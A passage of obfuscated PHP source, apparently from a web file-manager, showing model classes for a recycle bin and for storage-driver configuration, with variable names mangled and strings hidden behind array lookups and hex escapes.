ÚÄïÖŞ[$‰¬‡¹í[455]]; $©Ø¯ƒñô = array_to_keyvalue($ò¶Ş¯²³, $‰¬‡¹í[12], $‰¬‡¹í[202]); $¸†‡¨ÈÖ = array_to_keyvalue($ò¶Ş¯²³, $‰¬‡¹í[12], $‰¬‡¹í[2361]); foreach ($ò¶Ş¯²³ as $¯‹Öœû®) { $ö–é˜‚Á = $¯‹Öœû®[$‰¬‡¹í[545]]; if ($¯‹Öœû®[$‰¬‡¹í[43]] == $‰¬‡¹í[648] && isset($ö–é˜‚Á[$‰¬‡¹í[1287]])) { $©Ø¯ƒñô[] = $ö–é˜‚Á[$‰¬‡¹í[1287]] . $‰¬‡¹í[12]; $©Ø¯ƒñô[] = $ö–é˜‚Á[$‰¬‡¹í[1288]] . $‰¬‡¹í[12]; } if ($¯‹Öœû®[$‰¬‡¹í[43]] == $‰¬‡¹í[2371] && isset($ö–é˜‚Á[$‰¬‡¹í[202]])) { $©Ø¯ƒñô[] = $ö–é˜‚Á[$‰¬‡¹í[202]] . $‰¬‡¹í[12]; } } $©Ø¯ƒñô = array_merge($©Ø¯ƒñô, $¸†‡¨ÈÖ, array($ßÜ—Ïãó . $‰¬‡¹í[12])); $©Ø¯ƒñô = array_unique($©Ø¯ƒñô); $ØúƒŸÊı = array_unique(array_to_keyvalue($ò¶Ş¯²³, $‰¬‡¹í[12], $‰¬‡¹í[1537])); $î‡ì¿Ğô = Model($‰¬‡¹í[622])->userListInfo($ØúƒŸÊı); $ò…îªä” = Model($‰¬‡¹í[929])->sourceListInfo($©Ø¯ƒñô, !0); foreach ($ò¶Ş¯²³ as &$¯‹Öœû®) { if ($¯‹Öœû®[$‰¬‡¹í[43]] == $‰¬‡¹í[648] && isset($¯‹Öœû®[$‰¬‡¹í[545]][$‰¬‡¹í[1287]])) { $¯‹Öœû®[$‰¬‡¹í[545]][$‰¬‡¹í[1287]] = $ò…îªä”[$¯‹Öœû®[$‰¬‡¹í[545]][$‰¬‡¹í[1287]]]; $¯‹Öœû®[$‰¬‡¹í[545]][$‰¬‡¹í[1288]] = $ò…îªä”[$¯‹Öœû®[$‰¬‡¹í[545]][$‰¬‡¹í[1288]]]; } if ($¯‹Öœû®[$‰¬‡¹í[43]] == $‰¬‡¹í[2371] && isset($¯‹Öœû®[$‰¬‡¹í[545]][$‰¬‡¹í[202]])) { $¯‹Öœû®[$‰¬‡¹í[545]][$‰¬‡¹í[202]] = $ò…îªä”[$¯‹Öœû®[$‰¬‡¹í[545]][$‰¬‡¹í[202]]]; } $¯‹Öœû®[$‰¬‡¹í[100]] = $ò…îªä”[$¯‹Öœû®[$‰¬‡¹í[202]]]; $¯‹Öœû®[$‰¬‡¹í[2376]] = $ò…îªä”[$¯‹Öœû®[$‰¬‡¹í[2361]]]; if ($¯‹Öœû®[$‰¬‡¹í[43]] == $‰¬‡¹í[1275]) { $¯‹Öœû®[$‰¬‡¹í[2376]] = $¯‹Öœû®[$‰¬‡¹í[100]]; $¯‹Öœû®[$‰¬‡¹í[2361]] = $¯‹Öœû®[$‰¬‡¹í[2376]][$‰¬‡¹í[202]]; $¯‹Öœû®[$‰¬‡¹í[100]] = !1; $¯‹Öœû®[$‰¬‡¹í[202]] = $‰¬‡¹í[12]; } $¯‹Öœû®[$‰¬‡¹í[2300]] = $î‡ì¿Ğô[$¯‹Öœû®[$‰¬‡¹í[1537]]]; } unset($¯‹Öœû®); $ ÚÄïÖŞ[$‰¬‡¹í[455]] = $ò¶Ş¯²³; return $ ÚÄïÖŞ; } public function removeBySource($•ªµëÃ„) { $²’ãş = array($_SERVER[ŒÅŸ‹ä†][511] => $•ªµëÃ„); $this->where($²’ãş)->remove(); } } goto cä‹…”´™í; dô™Çã¢: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\x63\145\x5f\162\x65\143\x79\143\154\145"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\151\155\145", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\146\165\156\143\164\x69\157\x6e")); public function listData($º¬¹½°¨ = false) { $¼£—ë =& $_SERVER[ŒÅŸ‹ä†]; $º¬¹½°¨ = $º¬¹½°¨ ? $º¬¹½°¨ : USER_ID; $Û¹‰Øá = $this->where(array($¼£—ë[1911] => $º¬¹½°¨))->select(); return array_to_keyvalue($Û¹‰Øá, $¼£—ë[12], $¼£—ë[202]); } public function moveToRecycle($‘åı“û§) { $¯¨Ş¿¤û =& $_SERVER[ŒÅŸ‹ä†]; $§µ‹ìÜ‡ = Model($¯¨Ş¿¤û[1477]); $»êÆá´ = $§µ‹ìÜ‡->sourceInfo($‘åı“û§); if (!$»êÆá´ || $»êÆá´[$¯¨Ş¿¤û[525]] == $¯¨Ş¿¤û[101]) { return; } $™ĞŸîš• = array($¯¨Ş¿¤û[511] => $‘åı“û§, $¯¨Ş¿¤û[1911] => USER_ID, $¯¨Ş¿¤û[676] => $»êÆá´[$¯¨Ş¿¤û[199]], $¯¨Ş¿¤û[677] => $»êÆá´[$¯¨Ş¿¤û[594]], $¯¨Ş¿¤û[680] => $»êÆá´[$¯¨Ş¿¤û[609]]); $this->add($™ĞŸîš•); $this->recycleMove($‘åı“û§, 1); if ($»êÆá´[$¯¨Ş¿¤û[505]] == $¯¨Ş¿¤û[101]) { $öÕÛ“çË = array($¯¨Ş¿¤û[680] => array($¯¨Ş¿¤û[640], $»êÆá´[$¯¨Ş¿¤û[609]] . $‘åı“û§ . $¯¨Ş¿¤û[641])); $§µ‹ìÜ‡->where($öÕÛ“çË)->setField($¯¨Ş¿¤û[525], 1); } } public function clear() { $this->remove(!1); } public function remove($Æïúê‰Ş = false, $ÅšñŠ‘æ = false) { $‰ØÏÏ– =& $_SERVER[ŒÅŸ‹ä†]; $ÅšñŠ‘æ = $ÅšñŠ‘æ ? $ÅšñŠ‘æ : USER_ID; $‰ïëöÃ = Model($‰ØÏÏ–[1477]); $ª¼×±£¯ = $this->listData($ÅšñŠ‘æ); $Æïúê‰Ş = $Æïúê‰Ş === !1 ? !1 : $Æïúê‰Ş; $›äéÉÖ² = array(); foreach ($ª¼×±£¯ as $åš»øÂÓ) { if ($Æïúê‰Ş != !1 && !in_array($åš»øÂÓ, $Æïúê‰Ş)) { continue; } $ÉàíÆß¥ = $‰ïëöÃ->sourceInfo($åš»øÂÓ); $‰ïëöÃ->remove($åš»øÂÓ, !1); $óÍ¶Ğè¢ = $ÉàíÆß¥[$‰ØÏÏ–[199]] . $‰ØÏÏ–[11] . $ÉàíÆß¥[$‰ØÏÏ–[594]]; $›äéÉÖ²[$óÍ¶Ğè¢] = array($‰ØÏÏ–[676] => $ÉàíÆß¥[$‰ØÏÏ–[199]], $‰ØÏÏ–[594] => $ÉàíÆß¥[$‰ØÏÏ–[594]]); $this->where(array($‰ØÏÏ–[202] => $åš»øÂÓ))->delete(); } foreach ($›äéÉÖ² as $Íøà´àÇ) { $‰ïëöÃ->targetSpaceUpdate($Íøà´àÇ[$‰ØÏÏ–[199]], $Íøà´àÇ[$‰ØÏÏ–[594]]); } } public function restore($€«ÙüñŞ = false) { $ª¡€ì® = $this->listData(); $this->_restoreSource($ª¡€ì®, $€«ÙüñŞ); } public function removeUserAll($Çü¾Ï²ë) { $this->remove(!1, $Çü¾Ï²ë); } public function restoreItem($‰÷“¾ôÁ) { $this->_restoreSource(array($‰÷“¾ôÁ), array($‰÷“¾ôÁ)); } private function _restoreSource($³ıƒ¸ÏŠ, $Šç½û°²) { $’˜ÄÄğÇ =& $_SERVER[ŒÅŸ‹ä†]; $ Ãô«éĞ = Model($’˜ÄÄğÇ[1477]); $Šç½û°² = $Šç½û°² == !1 ? !1 : $Šç½û°²; if (!$³ıƒ¸ÏŠ) { return !0; } $ôœŸÏêÚ = array(); foreach ($³ıƒ¸ÏŠ as $ ¢ç¥±ı) { if ($Šç½û°² != !1 && !in_array($ ¢ç¥±ı, $Šç½û°²)) { continue; } $¨¦Ã™±Ä = $ Ãô«éĞ->sourceInfo($ ¢ç¥±ı); $¶¨û¦šÆ = $ Ãô«éĞ->sourceInfo($¨¦Ã™±Ä[$’˜ÄÄğÇ[201]]); if ($¶¨û¦šÆ[$’˜ÄÄğÇ[525]] == $’˜ÄÄğÇ[101]) { continue; } $ Ãô«éĞ->lockMoveStart($ ¢ç¥±ı); $this->recycleMove($ ¢ç¥±ı, 0); if ($¨¦Ã™±Ä[$’˜ÄÄğÇ[505]] == $’˜ÄÄğÇ[101]) { $”÷õˆ´ = array($’˜ÄÄğÇ[680] => array($’˜ÄÄğÇ[640], $¨¦Ã™±Ä[$’˜ÄÄğÇ[609]] . $ ¢ç¥±ı . $’˜ÄÄğÇ[641])); $ Ãô«éĞ->where($”÷õˆ´)->setField($’˜ÄÄğÇ[525], 0); $this->restoreFolderChildren($ ¢ç¥±ı, $³ıƒ¸ÏŠ); } $this->where(array($’˜ÄÄğÇ[202] => $ ¢ç¥±ı))->delete(); $ Ãô«éĞ->folderSizeReset($¨¦Ã™±Ä[$’˜ÄÄğÇ[201]]); $ôœŸÏêÚ[] = $¨¦Ã™±Ä[$’˜ÄÄğÇ[201]]; if ($¨¦Ã™±Ä[$’˜ÄÄğÇ[505]] == $’˜ÄÄğÇ[101]) { $ôœŸÏêÚ[] = $ ¢ç¥±ı; } $ Ãô«éĞ->lockMoveEnd($ ¢ç¥±ı); } $ Ãô«éĞ->updateModifyTime($ôœŸÏêÚ); } private function restoreFolderChildren($°¯Ü»–ë, $‹øÃÄ€) { $‹ÃèïàÛ =& $_SERVER[ŒÅŸ‹ä†]; $¹»§Øù = Model($‹ÃèïàÛ[1477]); $º‘¬ˆğú = array($‹ÃèïàÛ[202] => array($‹ÃèïàÛ[7], array())); foreach ($‹øÃÄ€ as $¯Ş£Œ’ç) { if ($¯Ş£Œ’ç == $°¯Ü»–ë) { continue; } if (!$¹»§Øù->isParentOf($°¯Ü»–ë, $¯Ş£Œ’ç)) { continue; } $·òÛëô = $¹»§Øù->sourceInfo($¯Ş£Œ’ç); if ($·òÛëô[$‹ÃèïàÛ[505]] == $‹ÃèïàÛ[101]) { $º‘¬ˆğú[] = array($‹ÃèïàÛ[680] => array($‹ÃèïàÛ[640], $·òÛëô[$‹ÃèïàÛ[609]] . $¯Ş£Œ’ç . $‹ÃèïàÛ[641])); } else { $º‘¬ˆğú[$‹ÃèïàÛ[202]][1][] = $¯Ş£Œ’ç; } } if (!$º‘¬ˆğú[$‹ÃèïàÛ[202]][1]) { unset($º‘¬ˆğú[$‹ÃèïàÛ[202]]); } if (!$º‘¬ˆğú) { return; } if (is_array($º‘¬ˆğú[$‹ÃèïàÛ[202]]) && is_array($º‘¬ˆğú[$‹ÃèïàÛ[202]][1])) { $º‘¬ˆğú[$‹ÃèïàÛ[202]][1] = array_unique($º‘¬ˆğú[$‹ÃèïàÛ[202]][1]); } $º‘¬ˆğú[$‹ÃèïàÛ[1111]] = $‹ÃèïàÛ[2226]; $¹»§Øù->where($º‘¬ˆğú)->setField($‹ÃèïàÛ[525], 1); } private function recycleMove($Ù—ñ«Šµ, $×Ã öÃ€ = 1) { $Ç¾®€á˜ =& $_SERVER[ŒÅŸ‹ä†]; $’ôåêÛ = Model($Ç¾®€á˜[1477]); $®ûú–¶ô = Model($Ç¾®€á˜[2458]); $Êú¥ŸÙß = array($Ç¾®€á˜[202] => $Ù—ñ«Šµ); if ($×Ã öÃ€) { $’ôåêÛ->where($Êú¥ŸÙß)->setField($Ç¾®€á˜[525], 1); $®ûú–¶ô->eventRecycle($Ù—ñ«Šµ, $Ç¾®€á˜[2459]); } else { $õıšì·î = $’ôåêÛ->where($Êú¥ŸÙß)->find(); $‰ĞìÂø‡ = $õıšì·î[$Ç¾®€á˜[505]] == $Ç¾®€á˜[101]; $ğ°Â€Åõ = $’ôåêÛ->fileNameAuto($õıšì·î[$Ç¾®€á˜[201]], $õıšì·î[$Ç¾®€á˜[42]], REPEAT_RENAME_FOLDER, $‰ĞìÂø‡); if ($ğ°Â€Åõ != $õıšì·î[$Ç¾®€á˜[42]]) { $’ôåêÛ->rename($Ù—ñ«Šµ, $ğ°Â€Åõ); } $’ôåêÛ->where($Êú¥ŸÙß)->setField($Ç¾®€á˜[525], 0); $®ûú–¶ô->eventRecycle($Ù—ñ«Šµ, $Ç¾®€á˜[2460]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x73\x6f\x75\162\143\x65\x53\x65\x63\x72\x65\164\114\151\x73\x74"; public $field = array("\x73\x6f\x75\x72\143\145\111\104", "\164\x79\160\145\x49\104", "\143\162\145\x61\x74\145\125\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x73\164\157\162\x61\x67\145\x4c\151\163\x74"; public $field = array("\156\x61\x6d\145", "\x73\x69\x7a\145\x4d\141\x78", "\163\x79\x73\164\x65\x6d", "\144\145\x66\141\165\x6c\164", "\x64\x72\151\x76\145\x72", "\x63\157\x6e\146\151\x67"); public function listData($¸úÂşé„ = false, $åƒ±·¥ì = "\x6d\x6f\144\x69\x66\171\x54\x69\155\x65", $®Ç êºÆ = false) { $âÇûí¸ =& $_SERVER[ŒÅŸ‹ä†]; $ˆ‡ØÛ” = parent::listData($¸úÂşé„, $åƒ±·¥ì, $®Ç êºÆ); if ($¸úÂşé„) { return $ˆ‡ØÛ”; } $Öì°ÅÖ‚ = array(); if ($GLOBALS[$âÇûí¸[2461]]) { $Öì°ÅÖ‚ = $this->ioSizeUseGet(array_to_keyvalue($ˆ‡ØÛ”, $âÇûí¸[12], $âÇûí¸[492])); } foreach ($ˆ‡ØÛ” as $„ˆ±Øüà => $ ŠÆ–Š) { unset($ˆ‡ØÛ”[$„ˆ±Øüà][$âÇûí¸[6]]); $ˆ‡ØÛ”[$„ˆ±Øüà][$âÇûí¸[2115]] = isset($Öì°ÅÖ‚[$ ŠÆ–Š[$âÇûí¸[492]]]) ? $Öì°ÅÖ‚[$ ŠÆ–Š[$âÇûí¸[492]]] : 0; } return $ˆ‡ØÛ”; } public function ioSizeUseGet($È‚Ş—¯) { $ŸÖ­­´ =& $_SERVER[ŒÅŸ‹ä†]; if (!$È‚Ş—¯) { return array(); } $£ÙÊª„È = $ŸÖ­­´[2462] . implode($ŸÖ­­´[60], $È‚Ş—¯); $¨óä¬Ÿ» = Cache::get($£ÙÊª„È); if ($¨óä¬Ÿ») { return $¨óä¬Ÿ»; } $ôƒ„ÁÂÈ = array($ŸÖ­­´[922] => $ŸÖ­­´[492], $ŸÖ­­´[2463] => $ŸÖ­­´[89]); $²èœÍĞ = array($ŸÖ­­´[922] => array($ŸÖ­­´[7], $È‚Ş—¯)); $¨óä¬Ÿ» = Model($ŸÖ­­´[890])->field($ôƒ„ÁÂÈ)->where($²èœÍĞ)->group($ŸÖ­­´[922])->select(); $¨óä¬Ÿ» = array_to_keyvalue($¨óä¬Ÿ», $ŸÖ­­´[492], $ŸÖ­­´[89]); Cache::set($£ÙÊª„È, $¨óä¬Ÿ», 600); return $¨óä¬Ÿ»; } public function getConfig($ö°õ‰­) { $‚»çù¢ = parent::listData($ö°õ‰­); $„½ö•Î = _get($‚»çù¢, $_SERVER[ŒÅŸ‹ä†][6], array()); if ($„½ö•Î && !is_array($„½ö•Î)) { $„½ö•Î = json_decode($„½ö•Î, !0); } return $„½ö•Î; } public function update($Œá‘Ã, $ î‹öşÍ) { $¾âı ¨ß =& $_SERVER[ŒÅŸ‹ä†]; $Ğàú­É¨ = $ î‹öşÍ[$¾âı ¨ß[42]]; $™åÂÓšá = array_to_keyvalue(parent::listData(), $¾âı ¨ß[42]); if (isset($™åÂÓšá[$Ğàú­É¨]) && $™åÂÓšá[$Ğàú­É¨][$¾âı ¨ß[492]] != $Œá‘Ã) { return !1; } $this->checkPwd($Œá‘Ã, $ î‹öşÍ); if (isset($ î‹öşÍ[$¾âı ¨ß[2464]]) && $ î‹öşÍ[$¾âı ¨ß[2464]] == $¾âı ¨ß[101]) { $this->checkConfig($ î‹öşÍ); } unset($ î‹öşÍ[$¾âı ¨ß[2464]]); $ºşóÎÓ£ = parent::update($Œá‘Ã, $ î‹öşÍ); if ($ºşóÎÓ£ && $ î‹öşÍ[$¾âı ¨ß[47]]) { foreach ($™åÂÓšá as $”úÂÁÎ) { if ($”úÂÁÎ[$¾âı ¨ß[47]] && $”úÂÁÎ[$¾âı ¨ß[492]] != $Œá‘Ã) { parent::update($”úÂÁÎ[$¾âı ¨ß[492]], array($¾âı ¨ß[47] => 0)); } } $this->updateBackup($Œá‘Ã, $™åÂÓšá); } return $ºşóÎÓ£; } public function add($ÒÍÕ¥Ÿ) { $å¶ œšÍ =& $_SERVER[ŒÅŸ‹ä†]; $­·ñÒÄ× = array_to_keyvalue(parent::listData(), $å¶ œšÍ[42]); if (isset($­·ñÒÄ×[$ÒÍÕ¥Ÿ[$å¶ œšÍ[42]]])) { return !1; } $this->checkConfig($ÒÍÕ¥Ÿ); $å¿Ê¬‰Ÿ = parent::insert($ÒÍÕ¥Ÿ); if ($å¿Ê¬‰Ÿ && $ÒÍÕ¥Ÿ[$å¶ œšÍ[47]]) { foreach ($­·ñÒÄ× as $ÄëûÉ…ƒ) { if ($ÄëûÉ…ƒ[$å¶ œšÍ[47]]) { parent::update($ÄëûÉ…ƒ[$å¶ œšÍ[492]], array($å¶ œšÍ[47] => 0)); } } $this->updateBackup($å¿Ê¬‰Ÿ, $­·ñÒÄ×); } return $å¿Ê¬‰Ÿ; } public function updateBackup($†©É˜µ¶, $í”™Ô‚) { $ÕÜ¦Ê× =& $_SERVER[ŒÅŸ‹ä†]; if ($†©É˜µ¶ == $ÕÜ¦Ê×[101]) { return; } $ˆµíÓ³‡ = Model($ÕÜ¦Ê×[844])->config(); $†Ìê²ø˜ = $ˆµíÓ³‡[$ÕÜ¦Ê×[848]]; if ($ˆµíÓ³‡[$ÕÜ¦Ê×[1890]] != $ÕÜ¦Ê×[101] || $†Ìê²ø˜ == $†©É˜µ¶) { return; } if ($†Ìê²ø˜ != $ÕÜ¦Ê×[101]) { $¿ÓûÀæì = array(); foreach ($í”™Ô‚ as $åÂÈãÈ¨) { if ($†©É˜µ¶ == $åÂÈãÈ¨[$ÕÜ¦Ê×[492]]) { continue; } $¿ÓûÀæì[] = $åÂÈãÈ¨[$ÕÜ¦Ê×[492]]; } if ($¿ÓûÀæì && in_array($†Ìê²ø˜, $¿ÓûÀæì)) { return; } } $›Á‚€¤ = Model($ÕÜ¦Ê×[869])->get($ÕÜ¦Ê×[876]); $›Á‚€¤ = json_decode($›Á‚€¤, !0); if (!$›Á‚€¤) { return; } $›Á‚€¤[$ÕÜ¦Ê×[848]] = $†©É˜µ¶; Model($ÕÜ¦Ê×[869])->set(array($ÕÜ¦Ê×[876] => $›Á‚€¤)); } public function checkPwd($Ğ€Ü ö, &$©¹…æ’î) { $€††‰£ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($©¹…æ’î[$€††‰£[6]])) { return; } $Àü ÉÖÜ = $©¹…æ’î[$€††‰£[6]]; if (!is_array($Àü ÉÖÜ)) { $Àü ÉÖÜ = json_decode($Àü ÉÖÜ, !0); } $õòéÂã = $€††‰£[12]; $¦ºç—ı = array($€††‰£[1585], $€††‰£[2465], $€††‰£[997]); foreach ($¦ºç—ı as $Ù©ã™à) { if (isset($Àü ÉÖÜ[$Ù©ã™à])) { $õòéÂã = $Ù©ã™à; break; } } if (!$õòéÂã) { return; } $‹Á¦ïüÔ = $this->getConfig($Ğ€Ü ö); $¹Ğé«°² = $‹Á¦ïüÔ[$õòéÂã]; $·ª¯œ™’ = $Àü ÉÖÜ[$õòéÂã]; if ($·ª¯œ™’ == str_repeat($€††‰£[231], strlen($¹Ğé«°²))) { $Àü ÉÖÜ[$õòéÂã] = $¹Ğé«°²; $©¹…æ’î[$€††‰£[6]] = json_encode($Àü ÉÖÜ); } else { if ($·ª¯œ™’ != $¹Ğé«°²) { $©¹…æ’î[$€††‰£[2464]] = $€††‰£[101]; } } } public function checkConfig(&$ş¢ğé¤³, $•èƒ‚Ã = false) { $Âêı¢· =& $_SERVER[ŒÅŸ‹ä†]; $Û×›Á”ş = strtolower($ş¢ğé¤³[$Âêı¢·[106]]); $­±¸×¢ƒ = $ş¢ğé¤³[$Âêı¢·[6]]; if (!is_array($­±¸×¢ƒ)) { $­±¸×¢ƒ = json_decode($­±¸×¢ƒ, !0); } foreach ($­±¸×¢ƒ as $±ß€¿Ü÷ => $äë¢áÙ) { if (is_string($äë¢áÙ)) { $­±¸×¢ƒ[$±ß€¿Ü÷] = trim($äë¢áÙ); } } $­±¸×¢ƒ[$Âêı¢·[2466]] = rand_string(6); $İıÃ«æ = $GLOBALS[$Âêı¢·[6]][$Âêı¢·[102]][$Âêı¢·[930]]; $Á€ÆÙÆ = isset($İıÃ«æ[$Û×›Á”ş]) ? $İıÃ«æ[$Û×›Á”ş] : ucfirst($Û×›Á”ş); $¦Ùßİ’ = $Âêı¢·[87] . $Á€ÆÙÆ; if (!$Á€ÆÙÆ || !class_exists($¦Ùßİ’)) { if ($•èƒ‚Ã) { return LNG($Âêı¢·[2467]); } write_log(array($Âêı¢·[2468], $ş¢ğé¤³, get_caller_info()), $Âêı¢·[224]); show_json(LNG($Âêı¢·[2467]), !1, $ş¢ğé¤³); } $ú…Ùû‚ò = new $¦Ùßİ’($­±¸×¢ƒ); $ÍñÔÙ£ = rtrim($­±¸×¢ƒ[$Âêı¢·[1310]], $Âêı¢·[8]) . $Âêı¢·[8]; if (in_array($Û×›Á”ş, $ú…Ùû‚ò->objectDriver)) { try { if (!$ú…Ùû‚ò->isBucketCors() && !$ú…Ùû‚ò->setBucketCors()) { $¨šÔ¦ÎÇ = LNG($Âêı¢·[2469]); $¨šÔ¦ÎÇ .= $Âêı¢·[2470] . LNG($Âêı¢·[2471]); } } catch (Exception $Õë…ñçê) { $¨šÔ¦ÎÇ = $Õë…ñçê->getMessage(); } if (isset($¨šÔ¦ÎÇ)) { return $this->_parseError($¨šÔ¦ÎÇ, $Û×›Á”ş, $•èƒ‚Ã); } if ($Û×›Á”ş == $Âêı¢·[78] && !$ú…Ùû‚ò->checkRegion()) { return $this->_parseError(LNG($Âêı¢·[2472]), $Û×›Á”ş, $•èƒ‚Ã); } } else { if ($Û×›Á”ş == $Âêı¢·[2473]) { if ($ú…Ùû‚ò->ftpPath) { $Ä¹¶´Ï­ = trim($ÍñÔÙ£, $Âêı¢·[8]); if (stripos($Ä¹¶´Ï­, trim($ú…Ùû‚ò->ftpPath, $Âêı¢·[8])) !== 0) { $ÍñÔÙ£ = $ú…Ùû‚ò->ftpPath . $Âêı¢·[8] . ($Ä¹¶´Ï­ ? $Ä¹¶´Ï­ . $Âêı¢·[8] : $Âêı¢·[12]); } } } } $Ê¸ÒåİĞ = $ú…Ùû‚ò->getPath($ÍñÔÙ£ . $Âêı¢·[1314]); try { if ($Û×›Á”ş == $Âêı¢·[117]) { $ú…Ùû‚ò->mkdir($ÍñÔÙ£); } $´çµ–öå = $ú…Ùû‚ò->mkfile($Ê¸ÒåİĞ); if (!$´çµ–öå) { $¨šÔ¦ÎÇ = LNG($Âêı¢·[2469]); } } catch (Exception $Õë…ñçê) { $¨šÔ¦ÎÇ = $Õë…ñçê->getMessage(); } if (isset($¨šÔ¦ÎÇ)) { return $this->_parseError($¨šÔ¦ÎÇ, $Û×›Á”ş, $•èƒ‚Ã); } $­±¸×¢ƒ[$Âêı¢·[1310]] = $ÍñÔÙ£; $ş¢ğé¤³[$Âêı¢·[6]] = json_encode($­±¸×¢ƒ); $ş¢ğé¤³[$Âêı¢·[106]] = $Á€ÆÙÆ; return !0; } private function _parseError($É‹ñõ©½, $¡ŸãôÜ¦, $§³¸íÙ† = false) { $ô³üÜñÈ =& $_SERVER[ŒÅŸ‹ä†]; if ($¡ŸãôÜ¦ == $ô³üÜñÈ[78] && stripos($É‹ñõ©½, $ô³üÜñÈ[2474])) { $Ú‚ñŸßŸ = explode($ô³üÜñÈ[10], $É‹ñõ©½); $‡Ğğğæ¥ = isset($Ú‚ñŸßŸ[1]) ? $Ú‚ñŸßŸ[1] : $ô³üÜñÈ[12]; $ÕÃ»§ïû = array($ô³üÜñÈ[2475] => LNG($ô³üÜñÈ[2476]), $ô³üÜñÈ[2477] => LNG($ô³üÜñÈ[2478])); if (isset($ÕÃ»§ïû[$‡Ğğğæ¥])) { $É‹ñõ©½ = $ÕÃ»§ïû[$‡Ğğğæ¥]; } } if (stripos($É‹ñõ©½, $ô³üÜñÈ[2479]) === 0) { $Å€ïÔø = strpos($É‹ñõ©½, $ô³üÜñÈ[186]); if ($Å€ïÔø === !1) { $Å€ïÔø = strpos($É‹ñõ©½, $ô³üÜñÈ[4]); } if ($Å€ïÔø !== !1) { $É‹ñõ©½ = substr($É‹ñõ©½, $Å€ïÔø + 1); } } $É‹ñõ©½ = LNG($ô³üÜñÈ[1317]) . $É‹ñõ©½; if ($§³¸íÙ†) { return $É‹ñõ©½; } show_json($É‹ñõ©½, !1); } public function driverListSystem() { $¼²óÂÍå =& $_SERVER[ŒÅŸ‹ä†]; $ôÍíã§« = parent::listData(); $Æ¶‘‘Ë“ = array(); foreach ($ôÍíã§« as $éãø™ã) { unset($éãø™ã[$¼²óÂÍå[242]], $éãø™ã[$¼²óÂÍå[98]]); if (!is_array($éãø™ã[$¼²óÂÍå[6]])) { $éãø™ã[$¼²óÂÍå[6]] = json_decode($éãø™ã[$¼²óÂÍå[6]], !0); } $Æ¶‘‘Ë“[] = $éãø™ã; } return $Æ¶‘‘Ë“; } public function defaultDriver() { $ß«ñô’÷ =& $_SERVER[ŒÅŸ‹ä†]; $Óú »§Ü = parent::listData(); $Ğ®¢Üµ = array_filter_by_field($Óú »§Ü, $ß«ñô’÷[47], 1); $Ğ®¢Üµ = $Ğ®¢Üµ[0]; if (!$Ğ®¢Üµ) { return array(); } if (!is_array($Ğ®¢Üµ[$ß«ñô’÷[6]])) { $Ğ®¢Üµ[$ß«ñô’÷[6]] = json_decode($Ğ®¢Üµ[$ß«ñô’÷[6]], !0); } return $Ğ®¢Üµ; } public function driverInfo($çõÀçØ–) { $¦ëøë»ü =& $_SERVER[ŒÅŸ‹ä†]; $´¢ÅæÅ° = array_to_keyvalue(parent::listData(), $¦ëøë»ü[492]); if (!isset($´¢ÅæÅ°[$çõÀçØ–])) { return !1; } $ı’¼†§° = $´¢ÅæÅ°[$çõÀçØ–]; if (!is_array($ı’¼†§°[$¦ëøë»ü[6]])) { $ı’¼†§°[$¦ëøë»ü[6]] = json_decode($ı’¼†§°[$¦ëøë»ü[6]], !0); } return $ı’¼†§°; } public function remove($éô¥€´Å) { $this->removeShareItems($éô¥€´Å); return parent::remove($éô¥€´Å); } public function removeWithFile($Íœ¯›¡ğ, $Ñ‹Øãü, $ßù¶¥İé, $À›«¯÷ø = false) { $ö¬¤£¹ˆ =& $_SERVER[ŒÅŸ‹ä†]; ignore_timeout(); $úÄ–ÔšÚ = array($ö¬¤£¹ˆ[922] => $Íœ¯›¡ğ); $ûò¢ÈÓ¸ = Model($ö¬¤£¹ˆ[565]); if (isset($GLOBALS[$ö¬¤£¹ˆ[2480]])) { $“ÎœÚúå = $GLOBALS[$ö¬¤£¹ˆ[2480]]; } else { $“ÎœÚúå = $ûò¢ÈÓ¸->where($úÄ–ÔšÚ)->field(array($ö¬¤£¹ˆ[2377] => $ö¬¤£¹ˆ[2082], $ö¬¤£¹ˆ[2481] => $ö¬¤£¹ˆ[89]))->find(); } $Ò¶Œª§÷ = intval($“ÎœÚúå[$ö¬¤£¹ˆ[2082]]); $ÄËôËºí = intval($“ÎœÚúå[$ö¬¤£¹ˆ[89]]); $Œò¼òÛê = $Ñ‹Øãü . $ö¬¤£¹ˆ[2482] . $Íœ¯›¡ğ; $½³†¿êŞ = LNG($Ñ‹Øãü == $ö¬¤£¹ˆ[648] ? $ö¬¤£¹ˆ[2483] : $ö¬¤£¹ˆ[2484]); $Îï‡¡‡† = new TaskFileTransfer($Œò¼òÛê, $ö¬¤£¹ˆ[224], $Ò¶Œª§÷, $½³†¿êŞ . $ö¬¤£¹ˆ[482] . $ßù¶¥İé[$ö¬¤£¹ˆ[42]] . $ö¬¤£¹ˆ[223] . $Íœ¯›¡ğ); $Îï‡¡‡†->task[$ö¬¤£¹ˆ[860]] = (double) $ÄËôËºí; $£°ÜÍ¯Æ = KodIO::defaultDriver(); $åî®…©ı = $£°ÜÍ¯Æ[$ö¬¤£¹ˆ[492]]; $ëÎ»Åóå = 1; $şœØ¶‡ò = 5000; $¶©”Ê§ò = $òåÛ¯É = $ÑŒáä¬æ = array(); $’Çè»İ§ = $ûò¢ÈÓ¸->where($úÄ–ÔšÚ)->field($ö¬¤£¹ˆ[2485])->selectPage($şœØ¶‡ò, $ëÎ»Åóå); $Š›Æ÷§¼ = intval($’Çè»İ§[$ö¬¤£¹ˆ[452]][$ö¬¤£¹ˆ[454]]); while ($’Çè»İ§ && $ëÎ»Åóå <= $Š›Æ÷§¼) { foreach ($’Çè»İ§[$ö¬¤£¹ˆ[455]] as $Ê—ÃÏÌˆ) { $ìû•©ÖÈ = $Ê—ÃÏÌˆ[$ö¬¤£¹ˆ[562]]; if ($À›«¯÷ø) { $òåÛ¯É[] = $ìû•©ÖÈ; continue; } $£Ã¸³çŸ = $Ê—ÃÏÌˆ[$ö¬¤£¹ˆ[97]]; $¹÷ßãş  = get_path_father($£Ã¸³çŸ); $ÑŒáä¬æ[] = $¹÷ßãş ; $¹÷ßãş  = str_replace("\173\151\x6f\x3a{$Íœ¯›¡ğ}\x7d\57", "\173\151\157\x3a{$åî®…©ı}\x7d\x2f", $¹÷ßãş 